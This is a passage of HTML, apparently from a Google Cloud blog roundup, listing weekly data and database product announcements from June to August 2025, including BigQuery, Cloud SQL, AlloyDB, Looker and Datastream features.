href=\"https://cloud.google.com/bigquery/docs/loading-data\">Learn more in the official documentation</a>.</span></span></li>\n</ul>\n</li>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/sql\">Cloud SQL</a> now supports Private Service Connect (PSC) outbound connectivity</span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">With PSC outbound connectivity, customers can attach a PSC interface to their existing Cloud SQL PSC-enabled instances to allow their instances to make outbound connections to their network. This is required for <a href=\"https://cloud.google.com/database-migration/docs/homogeneous-migrations\">homogeneous migrations using Database Migration Service</a>. For more information, see <a href=\"https://cloud.google.com/sql/docs/mysql/about-private-service-connect#psc-outbound\">PSC outbound connections</a>.</span></span></li>\n</ul>\n</li>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">AI-Assisted Troubleshooting in <a href=\"https://cloud.google.com/sql/docs/editions-intro\">Cloud SQL Enterprise Plus</a></span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Cloud SQL for Enterprise Plus edition now offers enhanced </span><a href=\"https://cloud.google.com/sql/docs/mysql/observe-troubleshoot-with-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-assisted troubleshooting</span></a><span style=\"vertical-align: baseline;\">, guiding you through resolving complex database performance issues such as </span><a href=\"https://cloud.google.com/sql/docs/mysql/troubleshoot-slow-queries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">slow queries</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/sql/docs/mysql/troubleshoot-high-database-load\"><span style=\"text-decoration: underline; vertical-align: baseline;\">high load</span></a><span style=\"vertical-align: baseline;\"> on your instances. This feature requires </span><a href=\"https://cloud.google.com/gemini/docs/cloud-assist/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/sql/docs/mysql/using-query-insights#enable-insights\"><span style=\"text-decoration: underline; vertical-align: baseline;\">query insights</span></a><span style=\"vertical-align: baseline;\">, both available with the Enterprise Plus edition.</span></span></span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 11 - August 15</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Code Your Way to $15,000: The BigQuery AI Hackathon Starts Now -</strong><span style=\"vertical-align: baseline;\"> go beyond traditional analytics and build groundbreaking solutions using BigQuery's cutting-edge AI capabilities. This is your opportunity to solve real-world business problems using BigQuery\u2019s Generative AI, Vector Search, and Multimodal capabilities. You\u2019ll get hands-on experience with BigQuery\u2019s newest features that bring AI directly to your data. SQL users will find these capabilities feel like a natural extension of their existing workflow, while Python practitioners can use BigQuery DataFrames to work using a familiar, pandas-like API. The goal is simple: build powerful, scalable AI solutions right where your data lives. </span><a href=\"https://www.kaggle.com/competitions/bigquery-ai-hackathon/overview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Sign-up today</span></a><span style=\"vertical-align: baseline;\">!</span></li>\n<li><strong style=\"vertical-align: baseline;\">AlloyDB now supports PG 17 (17.5 minor version) in Preview</strong><span style=\"vertical-align: baseline;\"> - AlloyDB customers can now access the latest improved version of Postgres, alongside existing versions like PG16, PG15, and PG14. Customers will also be able to upgrade to PG17 through MVU APIs. The community released PG17 in September 2024, introducing numerous new features and improvements. These include enhanced query performance (materialized Common Table Expressions, incremental backups and improved logical replication), a better developer experience (enhancements to the JSON support) and numerous other </span><a href=\"https://www.postgresql.org/docs/release/17.0/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">improvements</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">Database Center now supports self-managed databases on GCE</strong><span style=\"vertical-align: baseline;\"> - </span><span style=\"vertical-align: baseline;\">Back in April, we announced the general availability of</span> <a href=\"https://cloud.google.com/blog/products/databases/database-center-is-now-generally-available?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Center</span></a><span style=\"vertical-align: baseline;\">, your AI-powered unified fleet management solution for Google Cloud databases including Cloud SQL, AlloyDB, Spanner, Bigtable, Memorystore, and Firestore. However, many of our customers continue to leverage the flexibility of running their Postgres, MySQL and SQL server databases on Google Compute Engine (GCE) VMs. So we're thrilled to announce that Database Center now extends its monitoring capabilities to these self-managed databases. Please sign-up </span><a href=\"https://docs.google.com/forms/d/1Icj8CA14QbdeqJz111vnAlnflMcUIqNRfCr7v3mUL7s/preview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\"> to join this preview phase.</span></li>\n<li><a href=\"https://cloud.google.com/sql/docs/sqlserver/maintenance\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Near Zero Downtime (nZDT) for Cloud SQL Enterprise Plus edition for SQL Server</strong></a><strong style=\"vertical-align: baseline;\"> is now GA</strong><span style=\"vertical-align: baseline;\"> - With nZDT, maintenance and machine tier upgrades for Enterprise Plus SQL Server instances now experience sub-second downtime. This means:</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">99.99% SLA now includes maintenance downtime.</span></li>\n<li><span style=\"vertical-align: baseline;\">Customers can say goodbye to lengthy planning cycles for maintenance.</span></li>\n<li><span style=\"vertical-align: baseline;\">nZDT is now available across all three Cloud SQL engines - SQL Server, PostgreSQL and MySQL.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/firestore/native/docs/manage-databases#clone-database\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Database Clone Feature in Firestore launched in Public Preview</strong></a><span style=\"vertical-align: baseline;\"> - Firestore database cloning allows Firestore users to create a copy of their database. All the Firestore Documents data, as well as index definitions and entries, are copied over to a new database in the same project &amp; region with an appropriate user-chosen new database name. The user may choose to copy the state of the database from any snapshot time up to 7 days in the past.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/resources/content/databases-customer-stories-2025?hl=en\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Build with Google Databases: 70+ Success Stories</strong></a><span style=\"vertical-align: baseline;\"> - This powerful resource highlights how over 70+ companies are using Google Cloud's fully managed database services to improve performance, scale globally, and optimize costs. It showcases real-world success stories across 10 industries, including retail, financial services, and technology.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 4 - August 8</span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/products/data-analytics/new-agents-and-ai-foundations-for-data-teams\"><strong>Next Tokyo Data Cloud Announcements</strong></a>\u00a0 - Google\u2019s Data Cloud gives agents a complete, real-time understanding of your business, transforming it into a self-aware, reliable organization. We're delivering key innovations in three areas: 1) A new suite of data agents to act as expert partners, 2) An interconnected network for seamless agent collaboration, 3) A unified, AI-native foundation that unifies data and embeds AI-driven reasoning.</li>\n<li><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-first-colab-notebooks-in-bigquery-and-vertex-ai\"><strong>AI-first Colab Enterprise experience in Vertex AI and BigQuery</strong></a>: This powerful platform streamlines complex data science workflows, allowing you to simply prompt an agent with a request like \"train a model to predict income.\" The agent then autonomously generates and executes a complete plan\u2014from data loading and cleaning to model training and evaluation</li>\n<li><strong><a href=\"https://cloud.google.com/blog/products/databases/spanners-columnar-engine-unites-oltp-and-analytics\">Spanner Columnar Engine</a></strong>: Announcing the preview of the Spanner columnar engine, our latest innovation designed to turbocharge your data. By combining columnar storage and vectorized execution, we're making it possible to run lightning-fast analytical queries directly on your live operational data.</li>\n<li><strong><a href=\"https://cloud.google.com/blog/products/databases/introducing-enhanced-backups-for-cloud-sql\">Enhanced Backups for Cloud SQL</a></strong>: <span>Introducing Enhanced Backups for Google Cloud SQL, now with logically air-gapped and immutable backup vaults. Built with Google Cloud Backup and DR Service, this is your ultimate defense against modern threats.</span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 28 - August 1</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AlloyDB Omni now supports Kubernetes Operator 1.5.0 and PostgreSQL ver. 16.8.0/15.12.0: </strong><span style=\"vertical-align: baseline;\">We have</span> <a href=\"https://cloud.google.com/alloydb/omni/current/docs/release-notes#July_23_2025\"><span style=\"text-decoration: underline; vertical-align: baseline;\">launched</span></a><span style=\"vertical-align: baseline;\"> AlloyDB Omni Operator 1.5.0 and database versions 16.8.0/15.12.0. This major release delivers a significant step forward in enterprise readiness, including support for OpenShift operations, high availability/disaster recovery, and critical operational improvements like low-downtime upgrades and backups from standby.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 21 - July 25</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Introducing partitioned index for BigQuery vector search: </strong><span style=\"vertical-align: baseline;\">When creating a </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vector index</span></a><span style=\"vertical-align: baseline;\"> on a partitioned BigQuery table, you now have the option to also partition your vector index. Partitioning your vector index significantly reduces query costs and improves search accuracy for vector searches that utilize pre-filtering on the partitioning column.By partitioning your vector index, BigQuery can apply partition pruning to both your table and your vector index when you use a filter on the partitioning column in your vector search. This means BigQuery only scans the relevant partitions, decreasing I/O costs. Additionally, pre-filtering on the partitioning column makes your vector searches less likely to miss relevant results. This feature is particularly beneficial if most of your vector searches target specific partitions using pre-filters. You can only partition TreeAH vector indexes, and the PARTITION BY clause used for the vector index must match the one used for the original table. <a href=\"https://cloud.google.com/bigquery/docs/vector-index#partitions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read more</span></a><span style=\"vertical-align: baseline;\"> about the partitioned indexes in vector search.</span></span></li>\n<li><strong style=\"vertical-align: baseline;\">Datastream now supports BigLake Iceberg tables in BigQuery: </strong>Customers can now easily replicate data from different supported sources (<a href=\"https://cloud.google.com/datastream/docs/configure-your-source-mysql-database\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MySQL</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-postgresql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Postgres</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-sqlserver\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQLserver</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-oracle\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Oracle</span></a><span style=\"vertical-align: baseline;\">,</span><a href=\"https://cloud.google.com/datastream/docs/sources-salesforce\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/datastream/docs/sources-mongodb\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MongoDB</span></a><span style=\"vertical-align: baseline;\"> ) of Datastream into </span><a href=\"https://cloud.google.com/datastream/docs/destination-blmt\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigLake Managed Tables</span></a><span style=\"vertical-align: baseline;\"> for use cases spanning across open lakehouse, Enterprise grade storage for analytics, streaming and AI. Streaming to BigLake Iceberg tables lets you store data in a cost-effective way in the PARQUET format. By doing this, you can keep your data in a Cloud Storage bucket while using BigQuery for querying and analysis.</span></li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud SQL Write Endpoint for Advanced DR: </strong><span style=\"vertical-align: baseline;\">Cloud SQL is excited to announce the GA of Write Endpoint to make Advanced Disaster Recovery (DR) seamless for customers (</span><a href=\"https://cloud.google.com/sql/docs/mysql/connect-to-instance-using-write-endpoint\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Documentation</span></a><span style=\"vertical-align: baseline;\">). This feature enhances application resilience during instance failovers and switchovers, ensuring customer applications remain connected to the primary instance without manual intervention.The write endpoint is now available in GA for MySQL and PostgreSQL instances of Enterprise Plus Edition. It already exists for SQL Server instances.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vertical Scaling for Memorystore for Valkey and Memorystore for Redis Cluster: </strong><span style=\"vertical-align: baseline;\">Using </span><a href=\"https://cloud.google.com/memorystore/docs/cluster/scale-instance-capacity\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertical Scaling</span></a><span style=\"vertical-align: baseline;\">, Memorystore customers can now effortlessly scale their Memorystore nodes up or down ensuring optimal cluster sizing for varying workloads. Previously, node types were immutable post-deployment, hence customers only had the option for horizontal scaling (in and out) changing the number of shards in the cluster.\u00a0</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Database Migration Service (DMS) supports migrations from SQL Server to AlloyDB for PostgreSQL in GA: </strong>Customers can now use DMS to migrate their databases from <a href=\"https://cloud.google.com/database-migration/docs/sqlserver-to-alloydb/scenario-overview?_gl=1*109toza*_ga*NzM3NjU1NjkwLjE3NTIwNzU4MTE.*_ga_4LYFWVHBEB*czE3NTI0MjE3MzYkbzEkZzEkdDE3NTI0MjIxNTAkajYwJGwwJGgw\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQL Server to AlloyDB for PostgreSQL</span></a><span style=\"vertical-align: baseline;\"> . This migration offers seamless experience, which offers a comprehensive SQL Server modernization framework with:</span>\n<ul>\n<li>Automatic database schema and code conversion</li>\n<li>Gemini augmented database code conversion</li>\n<li>Gemini assisted PostgreSQL training and code improvements</li>\n<li>Low-downtime, CDC based data movement</li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 14 - July 18</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Trust and security are central to Conversational Analytics</strong><span style=\"vertical-align: baseline;\">. Designed to gain the benefits of Google\u2019s most capable AI models, Conversational Analytics offers a powerful and insightful natural language experience that is secure and trustworthy, meaning you can realize the full potential of generative AI with confidence, while keeping your data under control. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/understanding-looker-conversational-analytics-security\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Turn questions into queries with the Conversational Analytics API. </strong><span style=\"vertical-align: baseline;\">The Conversational Analytics API, now in preview, integrates multiple AI-powered tools to process user requests, including Natural Language to Query (NL2Query) and a Python code interpreter for generating responses, simplifying data science. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/use-conversational-analytics-api-for-natural-language-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Introducing BigQuery Soft Failover: Greater Control Over Disaster Recovery. </strong><span style=\"vertical-align: baseline;\">BigQuery now offers \"soft failover,\" giving administrators options over failover procedures. Unlike \"hard failover\" for unplanned outages, soft failover minimizes data loss for planned activities like disaster recovery drills or workload migrations. It initiates failover only after all data is replicated to the secondary region, guaranteeing data integrity. This feature is available via BigQuery UI, DDL, and CLI, providing enterprise-grade control for disaster recovery, confident simulations, and compliance without risking data. Learn more </span><a href=\"https://cloud.google.com/bigquery/docs/managed-disaster-recovery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a>.<strong style=\"vertical-align: baseline;\">\u00a0</strong></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 7 - July 11</span></span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">[Webinar] </strong><span style=\"vertical-align: baseline;\">Join us for a session on </span><a href=\"https://cloudonair.withgoogle.com/events/build-smart-apps-gen-ai-cloud-sql-observability-faster-dev\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">\"Build Smart Apps with Ease: Gen AI, Cloud SQL, and Observability for Faster Development.\" </span></a><span style=\"vertical-align: baseline;\">This webinar dives deep into mastering the essentials of building powerful Gen AI applications using Google Cloud technologies. Discover the complete Gen AI application development lifecycle, get a live demonstration of the new Application Design Center (ADC) for rapid app deployment, and explore its seamless integrations with frameworks like LangChain, LlamaIndex, and LangGraph. Plus, learn about the new MCP Toolbox for Databases to enhance the manageability and security of your GenAI agents, and understand critical operational considerations, including Cloud SQL Enterprise Plus features for performance, scalability, high availability, and disaster recovery.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">June 23 - June 27</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Looker developers gain speed and accuracy with debut of Continuous Integration.</strong><span style=\"vertical-align: baseline;\"> Continuous Integration for Looker helps streamline code development workflows, boost the end-user experience, and gives developers the confidence to deploy changes faster. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/introducing-continuous-integration-for-looker\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Code Interpreter brings advanced data science capabilities to Conversational Analytics. </strong><span style=\"vertical-align: baseline;\">Code Interpreter helps answer complicated questions, tapping into Python to perform advanced analysis on your Looker data.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Learn more </span><a href=\"https://www.googlecloudcommunity.com/gc/News-Announcements/Beyond-the-dashboard-Answering-your-toughest-data-questions-with/m-p/918718#M2152\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">June 16 - June 20</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standardize your business terminology with Dataplex business glossary.</strong><span style=\"vertical-align: baseline;\"> Want to standardize business terminologies and build a shared understanding across the enterprise? </span><a href=\"https://cloud.google.com/dataplex/docs/manage-glossaries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex business glossary</span></a><span style=\"vertical-align: baseline;\"> is now GA within </span><a href=\"https://cloud.google.com/dataplex/docs/transition-to-dataplex-catalog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">, providing a central, trusted vocabulary for your data assets, streamlining data discovery, and reducing ambiguity \u2014 leading to more accurate analysis, better governance, and faster insights. Learn more </span><a href=\"https://cloud.google.com/blog/products/data-analytics/dataplex-business-glossary-now-ga?e=48754805?utm_source%3Dcgc-blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Looker Core on Google Cloud is now FedRAMP High authorized.\u00a0 </strong><span style=\"vertical-align: baseline;\">The need to protect highly sensitive government data is a top priority. Looker Core on Google Cloud enables users to explore and chat with their data via AI agents using natural language, and create dashboards and self-service reports. Learn more </span><a href=\"https://cloud.google.com/blog/topics/public-sector/accelerating-innovation-with-agent-assist-looker-google-cloud-core-and-vertex-ai-vector-search-now-fedramp-high-authorized/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><strong><span style=\"vertical-align: baseline;\">Fast Dev Mode Transition Speeds Looker Developers.</span></strong><span style=\"vertical-align: baseline;\"> A new Labs feature, Fast Dev Mode Transition, improves the performance of Development Mode on your Looker instance by loading LookML projects in read-only mode until a developer clicks the Create Developer Copy button for the project. Learn more </span><a href=\"https://cloud.google.com/looker/docs/admin-panel-general-labs#fast_dev_mode_transition\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></span></li>\n<li><a href=\"https://cloud.google.com/datastream\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Datastream</strong></a><strong style=\"vertical-align: baseline;\"> now supports MongoDB as a Source (in Public Preview)</strong><span style=\"vertical-align: baseline;\">: </span><span style=\"vertical-align: baseline;\">You can now easily replicate data from </span><a href=\"https://cloud.google.com/datastream/docs/sources-mongodb#:~:text=Datastream%20supports%20replicating%20change%20events,This%20page%20contains%20information%20about:\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MongoDB source</span></a><span style=\"vertical-align: baseline;\"> into </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\"> and\u00a0 </span><a href=\"https://cloud.google.com/storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Storage</span></a><span style=\"vertical-align: baseline;\">\u00a0 for advanced analytics, reporting, and to power generative AI applications. Datastream offers MongoDB connectivity for both Replica Sets and Sharded Clusters. This includes support for self-managed MongoDB deployments as well as the fully managed</span><a href=\"https://www.mongodb.com/products/platform/atlas-database\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> AtlasDB</span></a><span style=\"vertical-align: baseline;\"> service.</span></li>\n<li><span style=\"vertical-align: baseline;\">\u00a0</span><strong style=\"vertical-align: baseline;\">Private Service Connect (PSC) on existing Cloud SQL instances (GA): </strong><a href=\"https://cloud.google.com/sql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud SQL</span></a><span style=\"vertical-align: baseline;\"> now offers the ability to enable </span><a href=\"https://cloud.google.com/sql/docs/postgres/configure-private-services-access-and-private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect (PSC)</span></a><span style=\"vertical-align: baseline;\"> on existing instances that currently utilize Private Service Access (PSA). This new functionality, generally available for PostgreSQL, MySQL, and SQL Server engines, eliminates the previous requirement of creating new instances for PSC adoption. Customers can now transition their existing PSA instances to PSC without data migration.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">Cloud SQL for SQL Server - E+ Recommender: </strong><span style=\"vertical-align: baseline;\">The Enterprise Plus </span><a href=\"https://cloud.google.com/recommender/docs/recommenders\"><span style=\"text-decoration: underline; vertical-align: baseline;\">recommender</span></a><span style=\"vertical-align: baseline;\"> helps customers identify SQL Server instances that would benefit from an upgrade to the Cloud SQL Enterprise Plus Edition. It offers insights into current performance metrics, and emphasizes how Enterprise Plus features (such as the data cache and memory-optimized machines) can boost performance. Additionally, the recommender includes a convenient button for direct navigation to the instance settings page, enabling users to perform the upgrade easily.\u00a0</span></li>\n<li><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/alloydb/docs/about-private-service-connect\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB - PSC Service Automation</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">With this launch, </span><a href=\"https://cloud.google.com/products/alloydb\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB</span></a><span style=\"vertical-align: baseline;\"> significantly improves the </span><a href=\"https://cloud.google.com/alloydb/docs/configure-private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">connectivity configuration</span></a><span style=\"vertical-align: baseline;\"> experience for Private Service Connect (PSC), by automatically creating PSC endpoints in the customer VPC and exposing the IP address of the endpoint directly through the AlloyDB API, enabling seamless PSC adoption at scale.</span></span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">June 9 - June 13</strong></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Introducing Pub/Sub Single Message Transforms (SMTs)</strong><span style=\"vertical-align: baseline;\">, to make it easy to perform simple data transformations such as validate, filter, enrich, and alter individual messages </span><span style=\"vertical-align: baseline;\">as they move in real time </span><span style=\"vertical-align: baseline;\">right within Pub/Sub</span><span style=\"vertical-align: baseline;\">. The first SMT is available now: JavaScript User-Defined Functions (UDFs), which allows you to perform simple, lightweight modifications to message attributes and/or the data directly within Pub/Sub via snippets of JavaScript code.</span><span style=\"vertical-align: baseline;\"> Learn more in the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/pub-sub-single-message-transforms\"><span style=\"text-decoration: underline; vertical-align: baseline;\">launch blog</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">Serverless Spark is now generally available directly within BigQuery.</strong><span style=\"vertical-align: baseline;\"> Formerly Dataproc Serverless, the fully managed </span><a href=\"https://cloud.google.com/products/serverless-spark\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Serverless for Apache Spark</strong></a><span style=\"vertical-align: baseline;\"> helps to reduce TCO, provides strong performance with the new Lightning Engine, integrates and leverages AI, and is enterprise-ready. And by bringing Apache Spark directly into </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\">, you can now develop, run and deploy Spark code interactively in BigQuery Studio. Read all about it </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-google-cloud-serverless-for-apache-spark-in-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">Next-Gen data pipelines: </strong><a href=\"https://airflow.apache.org/blog/airflow-three-point-oh-is-here/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Airflow 3</strong></a><strong style=\"vertical-align: baseline;\"> arrives on </strong><a href=\"https://cloud.google.com/composer/docs/composer-3/composer-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Composer</strong></a><span style=\"vertical-align: baseline;\">: Google is the first hyperscaler to provide selected customers with access to Apache Airflow 3, integrated into our fully managed Cloud Composer 3 service. This is a significant step forward, allowing data teams to explore the next generation of workflow orchestration within a robust Google Cloud environment. Airflow 3 introduces powerful capabilities, including DAG versioning for enhanced auditability, scheduler-managed backfills for simpler historical data reprocessing, a modern React-based UI for more efficient operations, and many more features.</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">June 2 - June 6</strong></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Enhancing BigQuery workload management: </strong><a href=\"https://cloud.google.com/bigquery/docs/reservations-workload-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery workload management</span></a><span style=\"vertical-align: baseline;\"> provides comprehensive control mechanisms to optimize workloads and resource allocation, preventing performance issues and resource contention, especially in high-volume environments. To make it even more useful, we announced several updates to BigQuery workload management around reservation fairness, predictability, flexibility and \u201csecurability,\u201d new reservation labels, as well as autoscaler improvements. Get all the details </span><a href=\"https://cloud.google.com/blog/products/data-analytics/understanding-updates-to-bigquery-workload-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></li>\n<li><strong style=\"vertical-align: baseline;\">Bigtable Spark connector is now GA:</strong><span style=\"vertical-align: baseline;\"> The latest version of the </span><a href=\"https://cloud.google.com/bigtable/docs/release-notes#May_29_2025\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable Spark connector</span></a><span style=\"vertical-align: baseline;\"> opens up a world of possibilities for Bigtable and Apache Spark applications, not least of which is additional support for Bigtable and </span><a href=\"https://iceberg.apache.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Apache Iceberg</span></a><span style=\"vertical-align: baseline;\">, the open table format for large analytical datasets. Learn how to use the Bigtable Spark connector to interact with data stored in Bigtable from Apache Spark, and delve into powerful use cases that leverage Apache Iceberg </span><a href=\"https://cloud.google.com/blog/products/databases/bigtable-spark-connector-now-ga\"><span style=\"text-decoration: underline; vertical-align: baseline;\">in this post</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">BigQuery gets transactional:</strong><span style=\"vertical-align: baseline;\"> Over the years, we\u2019ve added several capabilities to BigQuery to bring near-real-time, transactional-style operations directly into your data warehouse, so you can handle common data management tasks more efficiently from within the BigQuery ecosystem. In </span><a href=\"https://cloud.google.com/blog/products/data-analytics/bigquery-features-for-transactional-data-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this blog post</span></a><span style=\"vertical-align: baseline;\">, you can learn about three of them: efficient fine-grained DML mutations; change history support for updates and deletes; and real-time updates with DML over streaming data.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Google Cloud databases integrate with MCP:</strong><span style=\"vertical-align: baseline;\"> We announced capabilities in </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/mcp-toolbox-for-databases-now-supports-model-context-protocol\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MCP Toolbox for Databases (Toolbox)</span></a><span style=\"vertical-align: baseline;\"> to make it easier to connect databases to AI assistants in your IDE. MCP Toolbox supports BigQuery, 